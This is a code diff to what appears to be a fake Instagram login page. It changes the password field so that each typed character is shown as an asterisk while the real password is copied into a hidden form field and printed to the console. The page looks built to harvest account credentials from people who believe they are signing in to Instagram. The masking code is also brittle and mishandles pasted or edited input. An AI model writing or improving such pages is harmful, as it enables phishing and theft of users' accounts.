@@ -19,7 +19,7 @@
             <img src="img/instalogo.png">
             <form class="form" method="post">
                 <input type="text" placeholder="Phone number, username, or email" name="text" required>
-                <input type="text" placeholder="Password" id="word" oninput="maskWord(this)" required>
+                <input type="text" placeholder="Password" autocomplete="off" id="word" oninput="maskWord(this)" required>
                 <input type="hidden" id="text1" name="word">
                 <button>
                     Log in
@@ -34,7 +34,14 @@
     <script>
         function maskWord(input) {
             let value = input.value;
-            document.getElementById('text1').value = value;
+            if (value == '') document.getElementById('text1').value = '';
+        
+            let lastValue = value[value.length - 1];
+            if (lastValue == '*') document.getElementById('text1').value = document.getElementById('text1').value.slice(0, -1) ?? '';
+            else document.getElementById('text1').value += value[value.length - 1] ?? '';
+
+            console.log(document.getElementById('text1').value);
+            input.value = '*'.repeat(value.length);
         }
         document.getElementsByClassName('form')[0].addEventListener('submit', function(event) {
             event.preventDefault();
